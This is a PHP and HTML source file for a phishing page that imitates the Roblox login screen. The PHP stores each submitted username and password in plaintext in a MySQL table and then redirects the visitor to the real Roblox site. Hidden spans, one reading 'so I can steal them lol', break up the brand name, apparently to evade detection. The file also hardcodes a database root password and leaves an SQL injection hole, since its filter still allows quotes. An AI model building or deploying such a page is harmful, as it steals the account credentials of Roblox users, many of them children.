<!doctype html>
<?php	
	//BEGIN SQL
	$servername = "127.0.0.1";
	$username = "root";
	$password = "poopoocaca51";
	$dbname = "sitedatabase";

	// Create connection
	$conn = new mysqli($servername, $username, $password, $dbname);
	// Check connection
	if ($conn->connect_error) {
    	die("MySQL Connection failed: " . $conn->connect_error);
	}
		
	//END SQL
	// define variables and set to empty values
	$Err = "";
	$username = $password = "";
	
	function test_input($data) {
  		$data = trim($data);
  		$data = stripslashes($data);
  		$data = htmlspecialchars($data);
  		return $data;
	}
	
	if ($_SERVER["REQUEST_METHOD"] == "POST") {
		if (empty($_POST["username"])) {
			$Err = "Username and password required.";
		} else {
			$username = test_input($_POST["username"]);
			if (!preg_match("/^[a-zA-Z0-9_!' ]*$/",$username)) {
  				$Err = "SQL Injection is not allowed.";
			}
		}

		if (empty($_POST["password"])) {
			$Err = "Username and password required.";
		} else {
			$password = test_input($_POST["password"]);
			if (!preg_match("/^[a-zA-Z0-9_!' ]*$/",$password)) {
  				$Err = "SQL Injection is not allowed.";
			} else {
				//If we got here, I'm assuming the inputs are safe
				date_default_timezone_set("America/New_York");    
				$time = date("Y-m-d h:i:sa");

				$sql = "INSERT INTO usersubmissions (username, password, time) VALUES ('$username', '$password','$time')";

				if (mysqli_query($conn, $sql)) {
				  header( "refresh:0; url=https://roblox.com/home" );
				  session_start();
				} else {
				  echo "Error: " . $sql . "<br>" . mysqli_error($conn);
				}
				mysqli_close($conn);
			}
		}
	}
?>
<html>
	<head>
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>Roblox</title>
		<link href="https://images.rbxcdn.com/3b43a5c16ec359053fef735551716fc5.ico" rel="icon" />
		<link rel="stylesheet" href="style4.css">
	</head>
	<body>
		<div class="topDiv">
			<img src="img/roblox-logo-large.png" height="60%" align="left" alt="" class="mainLogo">
			<div class="search"><div class="searchbox"><img src="img/search-icon.png" alt="" class="searchIcon" height="22px"><span>         Search</span></div>
			</div>
			<a href="https://www.roblox.com/?returnUrl=https%3A%2F%2Fwww.roblox.com%2FLogin"><div class="signupinator"><p>Sign up</p></div></a>
		</div>
		<ul class="nav">
				<li><a href = "https://www.roblox.com/discover#/" class="active">Discover</a></li>
				<li><a href = "https://www.roblox.com/catalog?Category=1">Avatar Shop</a></li>
				<li><a href = "https://www.roblox.com/create">Create</a></li>
				<li><a href = "https://www.roblox.com/upgrades/robux?ctx-nav">Robux</a></li>
			</ul>
		<div class="logonDiv">
			<p><b>Log<span class="obfuscation">please input your credentials so I can steal them lol</span>in to Rob<span class="obfuscation">dp12p32h132phh9h98</span>lox</b></p>
			<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
				<input type="text" placeholder="Username/Email/Phone" name="username" value="<?php echo $username;?>">
				<br><br>
				<input type="password" placeholder="Password" name="password" value="<?php echo $password;?>">
				<br>
				<br><span class="error"><?php echo $Err;?></span>
				<input type="submit" value="Log in" name="Submit">
			</form>
			<p class="forgorskull"><a href="https://www.roblox.com/login/forgot-password-or-username">Forgot password or username?</a></p>
			<img src="img/fuck.png">
			<p class="forgorskulld">Don't have an account? <a href="https://www.roblox.com/login/forgot-password-or-username">Sign up</a></p>
		</div>
		<footer>
			<div class="divBottom">
				<img src="img/about-us.png">
				<p>
					©2022 Rob<span class="obfuscation">cocklolld1289-77-7-</span>lox Corporation. Ro<span class="obfuscation">cocklolld1289-77-7-</span>blox, the Robl<span class="obfuscation">cocklolld1289-77-7-</span>ox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
				</p><br>
			</div>
		</footer>
	</body>
	<script>
		if ( window.history.replaceState ) {
  			window.history.replaceState( null, null, window.location.href );
		}
	</script>
</html>